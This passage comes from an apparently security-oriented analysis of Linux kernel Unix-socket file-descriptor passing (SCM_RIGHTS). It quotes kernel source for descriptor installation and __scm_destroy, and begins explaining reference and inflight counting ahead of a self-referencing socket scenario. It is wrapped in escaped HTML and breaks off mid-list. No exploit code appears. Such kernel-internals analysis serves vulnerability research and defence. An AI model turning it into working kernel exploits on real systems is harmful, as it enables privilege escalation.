class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;int&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;new_fd&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; err &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;security_file_receive&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;[&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;]);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;err&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;break&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; err &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;get_unused_fd_flags&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;MSG_CMSG_CLOEXEC &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;msg&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;msg_flags&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;?&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;O_CLOEXEC &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;:&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;err &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;break&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; new_fd &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;err&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; err &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;put_user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;new_fd&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;cmfptr&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;err&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; put_unused_fd&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;new_fd&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;break&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Bump the usage count and install the file. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sock &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;sock_from_file&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;[&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;],&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;err&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sock_update_netprioidx&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk_cgrp_data&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sock_update_classid&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk_cgrp_data&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fd_install&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;new_fd&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;get_file&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;[&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;]));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;hellip;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* All of the files that fit in the message have had their&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* usage counts incremented, so we just free the list.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;__scm_destroy&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;scm&lt;/span&gt;&lt;span class=\"c10 c13 c7\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Once the file descriptors have been installed&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;__scm_destroy&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/core/scm.c#L119\"&gt;link&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) cleans up the allocated &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm-&amp;gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;and decrements the file reference count for every transmitted file structure:&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f6edb942990216f6cb0c4a0bd7dc5c0cd5bf15f9\"&gt;&lt;/a&gt;&lt;a id=\"t.6\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;void&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;__scm_destroy&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_cookie &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm_fp_list &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;int&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scm&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;for&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;count&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;--)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fput&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;[&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;i&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;]);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free_uid&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fpl&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.zi0w3dhxm2me\"&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;Reference Counting and Inflight Counting&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;As mentioned above, when a file descriptor is passed using &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;its reference count is immediately incremented. Once the recipient socket has accepted and installed the passed file descriptor, the reference count is then decremented. The complication comes from the &amp;ldquo;middle&amp;rdquo; of this operation: after the file descriptor has been sent, but before the receiver has accepted and installed the file descriptor.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Let&amp;rsquo;s consider the following scenario:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c27 lst-kix_3a2g7o19wgb3-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;The process creates sockets &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A &lt;/span&gt;&lt;span&gt;to socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span 